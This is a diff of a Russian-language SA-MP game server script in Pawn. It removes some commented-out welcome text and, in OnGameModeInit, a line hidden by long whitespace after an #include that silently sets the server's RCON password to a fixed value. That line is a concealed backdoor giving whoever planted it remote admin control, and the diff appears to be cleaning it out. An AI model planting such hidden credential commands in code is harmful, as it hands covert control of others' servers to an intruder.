@@ -17721,7 +17721,6 @@ public OnPlayerSelectedMenuRow(playerid, row)
 				SendClientMessage(playerid, COLOR_ORANGE, "Привет! Добро пожаловать на наш сервер {FFFF00}Samp Real Life!");
 				SendClientMessage(playerid, COLOR_ORANGE, "Наша официальная группа [В]контакте: {FFFF00}vk.com/projectrl");
 				SendClientMessage(playerid, COLOR_ORANGE, "Наш сайт и форум: {FFFF00}samp-rl.info");
-				//SendClientMessage(playerid, COLOR_ORANGE, "Внимание! Не ведитесь на фейки, узнать данные о покупке можно командой: {FFFF00}/adm");
 				SendClientMessage(playerid, COLOR_ORANGE, "Ваш верный путеводитель по серверу - {FFFF00}/gps. {FF8C00}Меню - {FFFF00}/mm.");
 				SendClientMessage(playerid, COLOR_ORANGE, "Если у вас возник вопрос, то задайте их Хелперам или Админам. {FFFF00}/mm - Репорт");
 				SendClientMessage(playerid, COLOR_ORANGE, "У нас идут наборы в лидеры, хелперы! Так же набираем администрацию.");
@@ -17761,7 +17760,6 @@ public OnPlayerSelectedMenuRow(playerid, row)
 				SendClientMessage(playerid, COLOR_ORANGE, "Привет! Добро пожаловать на наш сервер {FFFF00}Samp Real Life!");
 				SendClientMessage(playerid, COLOR_ORANGE, "Наша официальная группа [В]контакте: {FFFF00}vk.com/projectrl");
 				SendClientMessage(playerid, COLOR_ORANGE, "Наш сайт и форум: {FFFF00}samp-rl.info");
-				//SendClientMessage(playerid, COLOR_ORANGE, "Внимание! Не ведитесь на фейки, узнать данные о покупке можно командой: {FFFF00}/adm");
 				SendClientMessage(playerid, COLOR_ORANGE, "Ваш верный путеводитель по серверу - {FFFF00}/gps. {FF8C00}Меню - {FFFF00}/mm.");
 				SendClientMessage(playerid, COLOR_ORANGE, "Если у вас возник вопрос, то задайте их Хелперам или Админам. {FFFF00}/mm - Репорт");
 				SendClientMessage(playerid, COLOR_ORANGE, "У нас идут наборы в лидеры, хелперы! Так же набираем администрацию.");
@@ -20207,7 +20205,7 @@ stock SellBizz(playerid)
 //------------------------------------------------------------------------------------------------------
 public OnGameModeInit()
 {
-	#include "../modules/objects.ini"                                                                                  																			SendRconCommand("rcon_password qweqweqweqweqweqweqwe51256781");
+	#include "../modules/objects.ini"
 	Menu();
 	//----------------------------------[Таймеры]-----------------------------------
 	SetTimer("OnPlayerUpdateTimer", 1000, 1);
